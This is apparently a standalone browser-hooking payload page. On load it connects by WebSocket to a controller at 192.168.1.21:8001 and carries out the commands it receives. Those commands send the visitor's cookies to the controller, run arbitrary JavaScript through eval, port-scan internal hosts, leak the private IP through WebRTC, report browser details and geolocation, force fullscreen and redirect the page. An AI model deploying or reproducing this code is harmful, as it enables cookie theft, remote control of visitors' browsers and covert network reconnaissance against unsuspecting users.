<html>
<body>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
<h1 id="list" style="visibility: hidden;"></h1>
<script>
var WebS = new WebSocket("ws://192.168.1.21:8001");
</script>
<script>
var AttackAPI = {
    version: '0.1',
    author: 'Petko Petkov (architect)',
    homepage: 'http://www.gnucitizen.org'};

AttackAPI.PortScanner = {};
AttackAPI.PortScanner.scanPort = function (callback, target, port, timeout) {
    var timeout = (timeout == null)?100:timeout;
    var img = new Image();

    img.onerror = function () {
        if (!img) return;
        img = undefined;
        callback(target, port, 'open');
    };

    img.onload = img.onerror;
    img.src = 'http://' + target + ':' + port;

    setTimeout(function () {
        if (!img) return;
        img = undefined;
        callback(target, port, 'closed');
    }, timeout);
};
AttackAPI.PortScanner.scanTarget = function (callback, target, ports, timeout)
{
    for (index = 0; index < ports.length; index++)
        AttackAPI.PortScanner.scanPort(callback, target, ports[index], timeout);
};

</script>
<script>
navigator.sayswho= (function(){
    var ua= navigator.userAgent, tem,
    M= ua.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i) || [];
    if(/trident/i.test(M[1])){
        tem=  /\brv[ :]+(\d+)/g.exec(ua) || [];
        return 'IE '+(tem[1] || '');
    }
    if(M[1]=== 'Chrome'){
        tem= ua.match(/\b(OPR|Edge)\/(\d+)/);
        if(tem!= null) return tem.slice(1).join(' ').replace('OPR', 'Opera');
    }
    M= M[2]? [M[1], M[2]]: [navigator.appName, navigator.appVersion, '-?'];
    if((tem= ua.match(/version\/(\d+)/i))!= null) M.splice(1, 1, tem[1]);
    return M.join(' ');
})();

</script>
<script>
function privip() {

// NOTE: window.RTCPeerConnection is "not a constructor" in FF22/23
	var RTCPeerConnection = /*window.RTCPeerConnection ||*/ window.webkitRTCPeerConnection || window.mozRTCPeerConnection;

	if (RTCPeerConnection) (function () {
    	var rtc = new RTCPeerConnection({iceServers:[]});
    	if (1 || window.mozRTCPeerConnection) {      // FF [and now Chrome!] needs a channel/stream to proceed
        	rtc.createDataChannel('', {reliable:false});
    	};
    
    	rtc.onicecandidate = function (evt) {
        	// convert the candidate to SDP so we can run it through our general parser
        	// see https://twitter.com/lancestout/status/525796175425720320 for details
        	if (evt.candidate) grepSDP("a="+evt.candidate.candidate);
    	};
    	rtc.createOffer(function (offerDesc) {
        	grepSDP(offerDesc.sdp);
        	rtc.setLocalDescription(offerDesc);
    	}, function (e) { console.warn("offer failed", e); });
    
    
    	var addrs = Object.create(null);
    	addrs["0.0.0.0"] = false;
    	function updateDisplay(newAddr) {
        	if (newAddr in addrs) return;
        	else addrs[newAddr] = true;
        	var displayAddrs = Object.keys(addrs).filter(function (k) { return addrs[k]; });
        	document.getElementById('list').textContent = displayAddrs.join(" or perhaps ") || "n/a";
    	}
    
    	function grepSDP(sdp) {
        	var hosts = [];
        	sdp.split('\r\n').forEach(function (line) { // c.f. http://tools.ietf.org/html/rfc4566#page-39
            	if (~line.indexOf("a=candidate")) {     // http://tools.ietf.org/html/rfc4566#section-5.13
                	var parts = line.split(' '),        // http://tools.ietf.org/html/rfc5245#section-15.1
                    	addr = parts[4],
                    	type = parts[7];
                	if (type === 'host') updateDisplay(addr);
            	} else if (~line.indexOf("c=")) {       // http://tools.ietf.org/html/rfc4566#section-5.7
                	var parts = line.split(' '),
                    	addr = parts[2];
                	updateDisplay(addr);
            	}
        	});
    	}
	})(); else {
    	var ipc = "<code>ifconfig | grep inet | grep -v inet6 | cut -d\" \" -f2 | tail -n1</code>";
    	document.getElementById('list').nextSibling.textContent = "In Chrome and Firefox your IP should display automatically, by the power of WebRTCskull.";
	}
}
var first = true;
WebS.onmessage = function (event) {
  console.log(event.data);
  if(event.data == 'cookies') {
  	window.msg = window.prefix + ':' + document.cookie;
  	WebS.send(window.msg);
  }
  if(event.data == 'alert') {
  	alert('testing tesing 123');
  }
  if(event.data == 'crash') {
  	window.location.href = 'https://austinjacks.github.io/beta-branch/injectable.html';
  }
  if(event.data == 'privip') {
  	privip();
  	setTimeout(function() {WebS.send(document.getElementById('list').innerHTML)}, 300);
  }
  if(event.data.split(':')[0]=='js') {
  	eval(event.data.split(':')[1]);
  }
  if(event.data == 'OS') {
  	WebS.send(navigator.platform)
  }
  if(event.data == 'User Agent') {
  	WebS.send(navigator.userAgent)
  }
  if(event.data == 'browser') {
  	WebS.send(navigator.sayswho)
  }
  if(event.data.split('*')[0] == 'pscan') {
  	var dtr = event.data.split('*');
  	AttackAPI.PortScanner.scanPort(function(a,b,c) {WebS.send(a+':'+b+':'+c)},dtr[1],dtr[2],1000)
  }
  if(event.data.split('*')[0] == 'pscanall') {
  	var dtr = event.data.split('*');
  	for (i=dtr[2];i<dtr[3];i++) {
  		AttackAPI.PortScanner.scanPort(function(a,b,c) {WebS.send(a+':'+b+':'+c)},dtr[1],i,1000)
  	}
  }
  if(event.data == 'ipinfo') {
  	$.get("https://ipinfo.io", function(response) {
    window.resp = response;
    WebS.send('<br>city:' + window.resp.city+'<br>'+'country:'+window.resp.country+'<br>'+'hostname:'+window.resp.hostname+'<br>'+'ip:'+window.resp.ip+'<br>'+'latitude/longitude:'+window.resp.loc+'<br>'+'org:'+window.resp.org + '<br>' +'postal:'+ window.resp.postal + '<br>' +'region:' + window.resp.region);
	}, "jsonp");
  }
  if(event.data == 'fullscreen') {
  	var el = document.documentElement
    , rfs = // for newer Webkit and Firefox
           el.requestFullScreen
        || el.webkitRequestFullScreen
        || el.mozRequestFullScreen
        || el.msRequestFullscreen
	if(typeof rfs!="undefined" && rfs){
  	rfs.call(el);
	} else if(typeof window.ActiveXObject!="undefined"){
  	// for Internet Explorer
  	var wscript = new ActiveXObject("WScript.Shell");
  	if (wscript!=null) {
     	wscript.SendKeys("{F11}");
  }
}
  }
  if (first) {
  	console.log('first!');
  	first = false;
  	window.prefix = event.data;
  }
}
</script>
</body>
</html>
